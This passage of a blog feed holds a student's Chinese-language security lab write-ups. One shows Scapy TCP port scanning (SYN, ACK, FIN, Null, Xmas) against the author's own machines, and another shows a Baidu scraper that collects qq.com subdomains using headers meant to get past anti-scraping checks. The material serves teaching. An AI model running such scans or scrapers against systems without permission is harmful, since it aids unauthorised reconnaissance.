title="Null扫描"></a>Null扫描</h5><ol><li><p>修改脚本如下，发送空包，若未接到任何应答包，则说明端口开放；若收到RST-ACK包，则说明端口关闭。<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930013428169.png" alt="image-20240930013428169"></p></li><li><p>对开放端口 <strong>80端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240929220738592.png" alt="image-20240929220738592"></p></li><li><p>对关闭端口 <strong>3000端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930013523551.png" alt="image-20240930013523551"></p></li></ol><hr><h5 id="Xmas扫描"><a href="#Xmas扫描" class="headerlink" title="Xmas扫描"></a>Xmas扫描</h5><ol><li><p>修改脚本如下，发送FIN PSH URG包，若未接到任何应答包，则说明端口开放；若收到RST-ACK包，则说明端口关闭。<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930013659105.png" alt="image-20240930013659105"></p></li><li><p>对开放端口 <strong>80端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930013734085.png" alt="image-20240930013734085"></p></li><li><p>对关闭端口 3000端口 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930013829129.png" alt="image-20240930013829129"></p></li></ol><hr><h4 id="对远程（有防火墙）主机的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描"><a href="#对远程（有防火墙）主机的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描" class="headerlink" title="对远程（有防火墙）主机的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描"></a>对远程（有防火墙）主机的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描</h4><ol><li><p>开启物理机的防火墙：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930014056319.png" alt="image-20240930014056319"></p></li><li><p>物理机的以太网ip：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930014915834.png" alt="image-20240930014915834"></p></li><li><p>修改脚本中的dest变量：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930014849590.png" alt="image-20240930014849590"></p></li></ol><hr><h5 id="半连接SYN扫描-1"><a href="#半连接SYN扫描-1" class="headerlink" title="半连接SYN扫描"></a>半连接SYN扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描，能够扫描到主机，但是端口是不开放的：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930015101297.png" alt="image-20240930015101297"></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930015337224.png" alt="image-20240930015337224"></p></li></ol><hr><h5 id="ACK扫描-1"><a href="#ACK扫描-1" class="headerlink" title="ACK扫描"></a>ACK扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930015654876.png" alt="image-20240930015654876"></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930015735989.png" alt="image-20240930015735989"></p></li></ol><hr><h5 id="FIN扫描-1"><a href="#FIN扫描-1" class="headerlink" title="FIN扫描"></a>FIN扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930015954894.png" alt="image-20240930015954894"></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930020038919.png" alt="image-20240930020038919"></p></li></ol><hr><h5 id="Null扫描-1"><a href="#Null扫描-1" class="headerlink" title="Null扫描"></a>Null扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930020328757.png" alt="image-20240930020328757"></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930020249984.png" alt="image-20240930020249984"></p></li></ol><hr><h5 id="Xmas扫描-1"><a href="#Xmas扫描-1" class="headerlink" title="Xmas扫描"></a>Xmas扫描</h5><ol><li><p>对开放端口 <strong>80端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930020447127.png" alt="image-20240930020447127"></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930020545241.png" alt="image-20240930020545241"></p></li></ol><hr><h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> IPy <span class="hljs-keyword">import</span> IP <span class="hljs-keyword">as</span> IPY<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> scapy.layers.inet <span class="hljs-keyword">import</span> IP, TCP, ICMP<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">通过设置flags位为&#x27;*&#x27;,根据不同的扫描方式修改‘*’的值</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># conf.L3socket=L3RawSocket</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">port_scan</span>(<span class="hljs-params">ip, port</span>):<br>    p = IP(dst=ip) / TCP(dport=<span class="hljs-built_in">int</span>(port), flags=<span class="hljs-string">&quot;FPU&quot;</span>)<br>    ans = sr1(p, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(ans)<br>    <span class="hljs-comment"># print(type(ans))</span><br><br>    <span class="hljs-keyword">if</span> ans == <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(ip, <span class="hljs-string">&quot;port&quot;</span>, port, <span class="hljs-string">&quot;is open.&quot;</span>)<br>    <span class="hljs-keyword">elif</span> ans[TCP].flags == <span class="hljs-string">&#x27;RA&#x27;</span>:<br>        <span class="hljs-comment"># ans.display()</span><br>        <span class="hljs-built_in">print</span>(ip, <span class="hljs-string">&quot;port&quot;</span>, port, <span class="hljs-string">&quot;is closed.&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ping</span>(<span class="hljs-params">dest</span>):<br>    ip_addr = IPY(dest)<br>    <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ip_addr:<br>        <span class="hljs-built_in">print</span>(ip)<br>        packet = IP(dst=<span class="hljs-built_in">str</span>(ip)) / ICMP() / <span class="hljs-string">b&#x27;rootkit&#x27;</span><span class="hljs-comment">#需要先构造IP协议包</span><br>        ping = sr1(packet, timeout=<span class="hljs-number">1</span>, verbose=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> ping:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[0;32;47m\t&quot;</span>+<span class="hljs-built_in">str</span>(ip) + <span class="hljs-string">&quot; is up!&quot;</span>+<span class="hljs-string">&quot;\033[0m&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(ip) + <span class="hljs-string">&quot; is down!&quot;</span>)<br><br><br><span class="hljs-comment"># ...</span><br><span class="hljs-comment"># 根据你的环境需改IP地址和端口</span><br><span class="hljs-comment"># ...</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    dest = <span class="hljs-string">&#x27;169.254.134.154&#x27;</span><br>    port = <span class="hljs-number">79</span><br>    Ping(dest)<br>    port_scan(dest, port)<br></code></pre></td></tr></table></figure><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 1</title>
    <link href="/2024/12/25/lab1/"/>
    <url>/2024/12/25/lab1/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-1-子域名收集实验"><a href="#Lab-1-子域名收集实验" class="headerlink" title="Lab 1-子域名收集实验"></a>Lab 1-子域名收集实验</h1><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>Windows 11</li><li>Python 3.7</li></ul><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>​本次实验主要考察大家的编程能力及子域名的信息收集方法，在文件夹 “Lab1_code” 提供了使用Bing搜索引擎的域名收集功能。请对该代码进行扩展，使其可支持百度搜索引擎的域名收集功能。需要实现如下功能：</p><ol><li><p>支持百度搜索引擎的域名提取，其中从百度搜索引擎提取的域名需为真实域名，而非百度的域名跳转链接；</p></li><li><p>可扩充其他功能，比如域名所在的标题等信息。</p></li></ol><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="收集子域名"><a href="#收集子域名" class="headerlink" title="收集子域名"></a>收集子域名</h4><ol><li><p>运行Sub_Domin_Search.py文件，可以在bing搜索时得到qq的子域名；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-09%20110515.png"></p></li><li><p>查看baidu搜索界面的源代码，发现子域名可以在带有result类的div标签下，查找mu标签找到；</p></li><li><p>而子域名的name可以在该div标签下的a标签中，读取a标签中的字符串即可得到子域名的名字；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240914091830339.png" alt="image-20240914091830339"></p></li><li><p>修改代码中的处理方式，读取子域名link与子域名中的name；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240914091310472.png"></p></li><li><p>修改accept和cookie：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240914100306716.png" alt="image-20240914100306716"></p></li><li><p>修改headers中的user-agent:</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240914100118899.png" alt="image-20240914100118899"></p></li><li><p>将referer修改为’<a href="https://wappass.baidu.com/'%EF%BC%9B">https://wappass.baidu.com/&#39;；</a></p></li><li><p>修改请求的url，图上标红的两个皆可（是一样的）：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240914100457788.png" alt="image-20240914100457788"></p></li><li><p>最终修改后的结果为：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240914100547542.png" alt="image-20240914100547542"></p></li></ol><hr><h4 id="扩展内容（添加网址名、状态码和真实子域名）"><a href="#扩展内容（添加网址名、状态码和真实子域名）" class="headerlink" title="扩展内容（添加网址名、状态码和真实子域名）"></a>扩展内容（添加网址名、状态码和真实子域名）</h4><ol><li><p>如果返回的状态码是302，则说明重定向了，就使用requests库，读取该网址headers中的真实网址；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240914095352728.png" alt="image-20240914095352728"></p></li></ol><hr><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ol><li><p>返回结果中有网址名、子域名url（可能重定向）、状态码和真实子域名；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240914095645494.png" alt="image-20240914095645494"></p></li></ol><hr><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 本次实验内容主要为：收集qq.com域名下的子域名，</span><br><span class="hljs-comment"># 收集方法为使用baidu搜索引擎，采用爬手段，爬取搜索到的域名</span><br><span class="hljs-comment"># baidu搜索引擎搜索子域名的语法为：domain:qq.com</span><br><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 用于请求网页</span><br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup  <span class="hljs-comment"># 用于处理获取的到的网页源码数据</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse  <span class="hljs-comment"># 用于处理url</span><br><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-comment"># 定义一个采用baidu搜索的方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">baidu_search</span>():<br>    Subdomain = []  <span class="hljs-comment"># 定义一个空列表用于存储收集到的子域名</span><br>    <span class="hljs-comment"># 定义请求头，绕过反爬机制</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 SLBrowser/8.0.1.4031 SLBChan/103&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,<br>        <span class="hljs-string">&#x27;referer&#x27;</span>: <span class="hljs-string">&#x27;https://wappass.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27; 更改为cookie &#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># 定义请求url</span><br>    <span class="hljs-comment"># 搜索domain:qq.com后，得到的url</span><br>    url = <span class="hljs-string">&#x27;https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=2&amp;tn=48021271_74_hao_pg&amp;wd=domain%3Aqq.com&amp;rsv_spt=1&amp;oq=site%2526lt%253B%2526lt%253BAqq.com&amp;rsv_pq=d10645db019102b5&amp;rsv_t=7550XiQnu5rij1O%2Bj%2F07K20DTPK9MBXAaBDNF621tU1uSsI73hDN7jIoGlNCYVQCw6uadikYZaU7&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_dl=th_1&amp;rsv_sug3=2&amp;rsv_sug1=1&amp;rsv_sug7=001&amp;rsv_sug2=0&amp;rsv_btype=t&amp;rsp=1&amp;rsv_sug9=es_0_1&amp;inputT=2967&amp;rsv_sug4=3014&amp;rsv_sug=4&#x27;</span><br>    <span class="hljs-comment"># 访问url，获取网页源码</span><br>    <span class="hljs-comment"># 找到隐藏的真实域名</span><br>    <span class="hljs-comment"># 不允许重定向</span><br><br>    resp = requests.get(url, headers=headers)<br>    soup = BeautifulSoup(resp.content,<br>                         <span class="hljs-string">&#x27;html.parser&#x27;</span>)  <span class="hljs-comment"># 创建一个BeautifulSoup对象，第一个参数是网页源码，第二个参数是Beautiful Soup 使用的 HTML 解析器，</span><br>    job_bt = soup.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=<span class="hljs-string">&quot;result&quot;</span>)  <span class="hljs-comment"># find_all()查找源码中所有&lt;h2&gt;标签的内容</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> job_bt:<br>        <span class="hljs-comment"># print(div)</span><br>        link = i.get(<span class="hljs-string">&#x27;mu&#x27;</span>)<br>        name = i.a.string<br><br>        <span class="hljs-comment"># 循环获取‘href’的内容</span><br>        <span class="hljs-comment"># urlparse是一个解析url的工具，scheme获取url的协议名，netloc获取url的网络位置</span><br>        domain = <span class="hljs-built_in">str</span>(urlparse(link).scheme + <span class="hljs-string">&quot;://&quot;</span> + urlparse(link).netloc)<br>        <span class="hljs-keyword">if</span> domain <span class="hljs-keyword">in</span> Subdomain:  <span class="hljs-comment"># 如果解析后的domain存在于Subdomain中则跳过，否则将domain存入子域名表中</span><br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(name)<br>            Subdomain.append(domain)<br>            <span class="hljs-built_in">print</span>(domain)<br>            r = requests.get(domain, headers=headers, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-built_in">print</span>(r.status_code)<br>            <span class="hljs-comment"># real = r.content.replace(&#x27;\r&#x27;, &#x27;&#x27;).replace(&#x27;In&#x27;,&#x27;&#x27;).replace(&#x27;\t&#x27;, &#x27;&#x27;)</span><br>            <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">302</span>:  <span class="hljs-comment"># 如果返回302，就从响应头获取真实地址</span><br>                real_url = r.headers.get(<span class="hljs-string">&#x27;Location&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 否则从返回内容中用正则表达式提取出来真实地址</span><br>                <span class="hljs-comment"># real_url = re.findall(&quot;href=&#x27;(.*?)&#x27;&quot;, r.text)[0]</span><br>                <span class="hljs-keyword">try</span>:<br>                    real_url = re.findall(<span class="hljs-string">&quot;URL=&#x27;(.*?)&#x27;&quot;</span>, r.text)[<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">except</span> IndexError:<br>                    real_url = <span class="hljs-string">&#x27;同上&#x27;</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;real_url is:&#x27;</span>, real_url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><br>baidu_search()<br></code></pre></td></tr></table></figure><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>why</title>
    <link href="/2024/12/25/why/"/>
    <url>/2024/12/25/why/</url>
    
    <content type="html"><![CDATA[<p>为什么我没有把首页图片改成功？</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>today</title>
    <link href="/2024/09/01/today/"/>
    <url>/2024/09/01/today/</url>
    
    <content type="html"><![CDATA[<p>开学了好想趋势，上着第一天早八就有诡异的清醒</p>]]></content>
    
    
    <categories>
      
      <category>boring</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>FIRST</title>
    <link href="/2024/08/28/FIRST/"/>
    <url>/2024/08/28/FIRST/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>我的第一篇 test</p>]]></content>
    
    
    <categories>
      
      <category>test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>post</title>
    <link href="/2024/08/27/post/"/>
    <url>/2024/08/27/post/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>test</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
